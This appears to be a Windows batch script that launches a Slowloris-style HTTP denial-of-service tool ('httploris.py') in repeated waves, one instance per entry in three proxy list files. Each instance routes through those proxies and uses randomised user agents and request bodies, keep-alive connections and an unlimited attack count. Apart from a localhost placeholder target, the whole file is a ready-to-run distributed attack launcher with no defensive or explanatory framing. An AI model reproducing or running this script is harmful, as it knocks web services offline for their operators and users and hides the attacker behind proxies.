FOR /L %%x IN (1,1,1) do (Call :1)

:1

FOR /F "tokens=1,2 delims=:" %%i in (proxy.txt) do (
start "%%i:%%j" httploris.py 127.0.0.1 --port 80 --page "/" --trylimit 999 --connectionlimit 20 --timebetweenconnections 5 --connectionspeed 1.5 --attacklimit 0 --threadlimit 1 --timebetweenthreads 1 --requesttype GET --useragent %random% --size 1510 --contenttype "application/x-www-form-urlencoded; charset=utf-8" --post %random% --socksversion HTTP --sockshost %%i --socksport %%j --referer "http://url.com/" --keepalive --gzip --finish)

ping -n 1 -w 3000 192.168.0.255

FOR /F "tokens=1,2 delims=:" %%i in (proxy2.txt) do (
start "%%i:%%j" httploris.py 127.0.0.1 --port 80 --page "/" --trylimit 999 --connectionlimit 20 --timebetweenconnections 5 --connectionspeed 2 --attacklimit 0 --threadlimit 1 --timebetweenthreads 1 --requesttype GET --useragent %random% --size 1520 --contenttype "application/x-www-form-urlencoded; charset=utf-8" --post %random% --socksversion HTTP --sockshost %%i --socksport %%j --referer "http://url.com/" --keepalive --gzip --finish)

ping -n 1 -w 3000 192.168.0.255

FOR /F "tokens=1,2 delims=:" %%i in (proxy3.txt) do (
start "%%i:%%j" httploris.py 127.0.0.1 --port 80 --page "/" --trylimit 999 --connectionlimit 20 --timebetweenconnections 5 --connectionspeed 3 --attacklimit 0 --threadlimit 1 --timebetweenthreads 1 --requesttype GET --useragent %random% --size 1530 --contenttype "application/x-www-form-urlencoded; charset=utf-8" --post %random% --socksversion HTTP --sockshost %%i --socksport %%j --referer "http://url.com/" --keepalive --gzip --finish)